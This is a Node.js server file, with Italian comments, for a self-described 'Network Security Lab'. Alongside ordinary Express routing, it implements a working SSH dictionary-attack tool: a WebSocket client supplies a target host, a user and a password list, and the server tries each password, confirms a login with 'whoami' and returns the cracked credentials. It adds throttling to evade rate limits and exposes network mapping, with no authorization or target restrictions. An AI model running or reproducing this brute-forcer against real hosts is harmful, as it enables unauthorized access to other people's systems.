require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const WebSocket = require('ws');
const { Client } = require('ssh2');
const crypto = require('crypto');

const config = require('./config');                   // src/config/index.js o simile
const apiRoutes = require('./api/routes');            // src/api/routes/index.js
const errorHandler = require('./api/middleware/errorHandler');
const { performAdvancedNetworkMapping } = require('./core/services/networkMapperService');


// ==== Express App Setup ====
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../public')));

// Test endpoint rapido
app.get('/test', (req, res) => {
  res.json({ message: 'Il server di test funziona correttamente!' });
});

// Monta tutte le API sotto /api/v1
app.use('/api/v1', apiRoutes);

// Health check base
app.get('/health', (req, res) => res.json({ status: 'ok', timestamp: new Date().toISOString() }));

// SPA fallback: serve index.html per tutte le altre route (frontend routing)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

// Gestione errori 404 (se mai arriva qui)
app.use((req, res, next) => {
  res.status(404).json({ error: `Endpoint non trovato: ${req.method} ${req.originalUrl}` });
});
app.use(errorHandler);


// ==== Classi SSH & Log ====
// Log directory (usa path assoluto per sicurezza)
const logDirPath = path.join(__dirname, '../logs');
if (!fs.existsSync(logDirPath)) fs.mkdirSync(logDirPath, { recursive: true });

class AuditLogger {
  constructor() {
    this.auditLogPath = path.join(logDirPath, 'ssh_audit.log');
    this.errorLogPath = path.join(logDirPath, 'ssh_errors.log');
  }
  logEvent(event) {
    const logEntry = { timestamp: new Date().toISOString(), ...event };
    const logString = JSON.stringify(logEntry) + '\n';
    fs.appendFileSync(this.auditLogPath, logString);
    if (event.level === 'error') {
      fs.appendFileSync(this.errorLogPath, logString);
    }
  }
}

class SSHErrorAnalyzer {
  static classify(err) {
    const errorMap = {
      'All configured authentication methods failed': 'Credenziali errate',
      'Connection timed out': 'Timeout connessione',
      'Handshake failed': 'Handshake fallito',
      'ECONNREFUSED': 'Connessione rifiutata'
    };
    for (const [pattern, message] of Object.entries(errorMap)) {
      if (err.message.includes(pattern)) return message;
    }
    return `Errore sconosciuto: ${err.message}`;
  }
}

class SSHConnectionManager {
  constructor(logger) {
    this.logger = logger;
    this.activeConnections = new Set();
  }
  async testCredentials(host, port, username, password) {
    if (this.activeConnections.size >= config.ssh_tool.max_concurrent_connections) {
      throw new Error('Troppe connessioni contemporanee');
    }
    const connectionId = crypto.randomUUID();
    this.activeConnections.add(connectionId);
    try {
      return await this._attemptConnection(host, port, username, password);
    } finally {
      this.activeConnections.delete(connectionId);
    }
  }
  _attemptConnection(host, port, username, password) {
    return new Promise((resolve) => {
      const conn = new Client();
      let resolved = false;
      const timeout = setTimeout(() => {
        if (!resolved) {
          resolved = true;
          conn.end();
          resolve({ success: false, error: 'Timeout connessione' });
        }
      }, config.ssh_tool.connection_timeout);

      conn.on('ready', () => {
        if (resolved) return;
        clearTimeout(timeout);
        resolved = true;
        this.logger.logEvent({ level: 'success', event: 'SSH_SUCCESS', target: `${username}@${host}` });
        conn.exec('whoami', (err, stream) => {
          if (err) {
            conn.end();
            return resolve({ success: false, error: 'Verifica post-login fallita' });
          }
          stream.on('close', () => {
            conn.end();
            resolve({ success: true });
          }).on('data', () => {});
        });
      });

      conn.on('error', (err) => {
        if (resolved) return;
        clearTimeout(timeout);
        resolved = true;
        const errorMsg = SSHErrorAnalyzer.classify(err);
        this.logger.logEvent({ level: 'error', event: 'SSH_FAILURE', target: `${username}@${host}`, error: errorMsg });
        conn.end();
        resolve({ success: false, error: errorMsg });
      });

      conn.connect({
        host,
        port,
        username,
        password,
        readyTimeout: config.ssh_tool.connection_timeout - 1000,
        algorithms: config.ssh_tool.algorithms,
        tryKeyboard: true
      });
    });
  }
}

class AttackSession {
  constructor(ws, logger) {
    this.ws = ws;
    this.logger = logger;
    this.sshManager = new SSHConnectionManager(logger);
    this.isActive = false;
  }

  async start({ host, port, user, passwords }) {
    if (this.isActive) {
      this._sendMessage('error', 'Un attacco è già in corso.');
      return;
    }
    if (!host || !user || !passwords || !Array.isArray(passwords)) {
      this._sendMessage('error', 'Parametri mancanti o non validi.');
      return;
    }

    this.isActive = true;
    const targetPort = port || 22;
    this._sendMessage('info', `Inizio attacco su ${user}@${host}:${targetPort}`);

    let found = false;
    for (let i = 0; i < passwords.length && this.isActive; i++) {
      const pwd = passwords[i];
      this._sendProgress(i + 1, passwords.length);
      try {
        this._sendMessage('attack', `Tentativo con -> ${user}:${'*'.repeat(pwd.length)}`);
        const result = await this.sshManager.testCredentials(host, targetPort, user, pwd);
        if (result.success) {
          found = true;
          this._sendResult(user, pwd);
          break;
        } else {
          this._sendMessage('error', result.error);
        }
      } catch (err) {
        this._sendMessage('error', `Errore critico: ${err.message}`);
      }
      // Ritardo configurato per evitare rate-limit
      await new Promise(r => setTimeout(r, config.ssh_tool.rate_limit_delay));
    }

    if (!found && this.isActive) {
      this._sendMessage('info', 'Attacco completato - Nessuna password trovata');
      this._send('finished', {});
    }

    this.logger.logEvent({ event: 'ATTACK_COMPLETE', target: `${user}@${host}:${targetPort}`, success: found });
    this.isActive = false;
  }

  stop() {
    this.isActive = false;
    this._sendMessage('warning', 'Attacco interrotto manualmente');
  }

  _send(type, data) {
    if (this.ws.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify({ type, ...data }));
    }
  }
  _sendMessage(level, message) {
    this._send('log', { level, message });
  }
  _sendProgress(current, total) {
    this._send('progress', { current, total });
  }
  _sendResult(username, password) {
    this._send('found', { username, password });
  }
}


// ==== Avvio server HTTP & WebSocket ====
const expressServer = app.listen(config.port, () => {
  console.log(`🚀 Network Security Lab Server in ascolto su http://localhost:${config.port}`);
  console.log(`🔧 API disponibili su http://localhost:${config.port}/api/v1`);
  console.log(`📱 Interfaccia Web: http://localhost:${config.port}/`);
});

const wss = new WebSocket.Server({ port: config.ssh_tool.port });
const sshLogger = new AuditLogger();

console.log(`⚡ WebSocket Server in ascolto sulla porta ${config.ssh_tool.port}`);
sshLogger.logEvent({ event: 'SERVER_START' });

wss.on('connection', (ws) => {
  const clientIp = ws._socket.remoteAddress;
  console.log(`🔌 Nuovo client WS connesso: ${clientIp}`);

  let activeSshSession = null;

  ws.on('message', async (data) => {
    try {
      const message = JSON.parse(data);
      console.log('Messaggio WS ricevuto:', message);

      switch (message.type) {
        case 'start_attack':
          sshLogger.logEvent({ event: 'CLIENT_CONNECT', clientIp });
          activeSshSession = new AttackSession(ws, sshLogger);
          ws.send(JSON.stringify({ type: 'log', level: 'success', message: 'Connessione SSH backend stabilita.' }));
          activeSshSession.start(message);
          break;

        case 'stop_attack':
          if (activeSshSession) activeSshSession.stop();
          break;

        case 'start_network_map':
          const progressCallback = (progressData) => {
            if (ws.readyState === WebSocket.OPEN) {
              ws.send(JSON.stringify({ type: 'network_map_progress', ...progressData }));
            }
          };

          try {
            const results = await performAdvancedNetworkMapping(message.network, message.options, progressCallback);
            if (ws.readyState === WebSocket.OPEN) {
              ws.send(JSON.stringify({ type: 'network_map_result', status: 'completed', data: results }));
            }
          } catch (error) {
            if (ws.readyState === WebSocket.OPEN) {
              ws.send(JSON.stringify({ type: 'network_map_result', status: 'error', message: error.message }));
            }
          }
          break;
      }
    } catch (err) {
      console.error('Errore parsing messaggio WS:', err);
    }
  });

  ws.on('close', () => {
    console.log(`❌ Client WS disconnesso: ${clientIp}`);
    if (activeSshSession) {
      sshLogger.logEvent({ event: 'CLIENT_DISCONNECT', clientIp });
      activeSshSession.stop();
    }
  });

  ws.on('error', (err) => {
    console.error('Errore WebSocket:', err);
    if (activeSshSession) {
      sshLogger.logEvent({ event: 'WEBSOCKET_SSH_ERROR', clientIp, error: err.message });
    }
  });
});
